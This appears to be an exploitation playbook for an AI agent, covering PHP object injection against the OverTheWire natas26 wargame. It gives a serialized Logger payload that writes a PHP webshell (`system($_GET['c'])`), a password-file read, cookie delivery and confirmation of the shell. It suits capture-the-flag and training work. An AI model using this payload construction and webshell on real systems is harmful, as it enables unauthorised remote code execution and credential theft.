# PHP object injection (unserialize)

`unserialize()` on attacker-controlled bytes instantiates arbitrary in-scope
classes; the damage comes from **magic methods** that fire automatically —
`__wakeup()` on unserialize, `__destruct()` at script end, `__toString()` when
the object is printed/concatenated, `__call()`. If any reachable class's magic
method does something dangerous with properties YOU control (file write,
`include`, SQL, `eval`, `system`), that's a POP (property-oriented programming)
chain. Look in cookies, hidden fields, query params, request bodies for a
base64 blob. Classic OverTheWire: **natas26** —
`unserialize(base64_decode($_COOKIE["drawing"]))` plus a `Logger::__destruct`
that writes a controllable `exitMsg` to a controllable `logFile`.

## 1. Spot it
- Decode the suspect blob in `browser_evaluate_js` (`atob`). The serialize
  grammar tells you what it is at a glance:
  - `O:LEN:"Name":N:{...}` = object of class `Name` with `N` properties
  - `a:N:{...}` = array, `s:LEN:"str"` = string (**LEN = byte length**),
    `i:`/`b:`/`d:` = int/bool/float, `N;` = null
  - Seeing `O:` in the blob — or just the app calling `unserialize` — is the tell.
- Read the source (natas exposes `index-source.html` / view-source; fetch with
  `http_request`). Find the `unserialize(...)` sink, then **enumerate the
  classes in scope and their magic methods**. The gadget is a magic method that
  uses a property you can set.

## 2. Build the serialize string EXACTLY — this is where runs fail
- Element separators are `;`, **not** `:`. A malformed blob → `unserialize():
  Error at offset N`. If you get that, decode your OWN blob and count bytes.
- `s:LEN:"..."` LEN counts **raw bytes** (UTF-8), not characters.
- **Private** properties are name-mangled: the key is `\x00ClassName\x00prop`
  (NUL + class + NUL + name) and its `s:` length **includes both NUL bytes**.
  Example: private `logFile` in class `Logger` → key `\x00Logger\x00logFile`,
  length **15**. **Protected** props mangle to `\x00*\x00prop` (3 extra bytes).
  **Public** props are the bare name.
- You may declare **fewer** properties than the class defines — set the count to
  the number of entries you actually provide (only the ones the gadget reads).
- NUL bytes don't survive plain `btoa` (latin1). In `browser_evaluate_js` build
  the bytes with `String.fromCharCode(0)` and base64 them with the `b2b64`
  helper from that tool's own description (raw-byte safe), not bare `btoa`.

## 3. Worked recipe — `__destruct` file-write → webshell (natas26 shape)
Gadget: `Logger::__destruct()` writes `$this->exitMsg` into `$this->logFile`.
Both are private props you control.

1. `logFile` = a **`.php` path in a directory the app demonstrably writes to AND
   serves** — natas writes its PNGs to `img/`, so `img/x.php` works (relative,
   resolved from the script cwd `/var/www/natas/natas26/`, or the absolute path).
   **Do NOT** target `/tmp` (not web-served) or guess blind `../../` traversal —
   that's the #1 way this exploit spirals.
2. `exitMsg` = the PHP you want written, e.g. `<?php system($_GET["c"]); ?>` or,
   to grab the next password directly,
   `<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>`.
3. Serialize (2 props is enough — `logFile` + `exitMsg`):
   `O:6:"Logger":2:{s:15:"\x00Logger\x00logFile";s:9:"img/x.php";s:15:"\x00Logger\x00exitMsg";s:LL:"<?php ...?>";}`
   then base64 it (raw-byte safe).
4. Deliver it as the `drawing` cookie with **`http_request`** (one shot,
   scriptable, exact cookie value):
   `http_request {url:".../index.php", cookies:{drawing:"<b64>"}}`. The script
   ends → `__destruct` fires → the file is written. Prefer this over
   `browser_set_cookie`+`browser_navigate` (flakier; domain/encoding pitfalls).
5. **Confirm**: `http_request` GET `.../img/x.php?c=id` (or read the hardcoded
   file). The response body is the proof / the next password — read it before
   doing anything else.

## 4. Other gadget shapes
`__wakeup`/`__destruct` → `include`/`require` on a property = LFI/RCE (chain
with [[file-inclusion-upload]]); `__toString` on echo/concat = SQLi or file
read; app expects an **array** → wrap the gadget object as one element so it
still deserializes; no app-level gadget → library classes (Monolog, Guzzle,
Laravel) carry known phpggc-style chains, craft by hand (mulot has no phpggc
bundled).

Evidence: the decoded crafted blob + the written file being served / its
contents (the next password). Remediation: never `unserialize()` attacker input;
use `json_decode`; if unavoidable pass `['allowed_classes' => false]`; sign
serialized state with a server-only secret the client never sees.
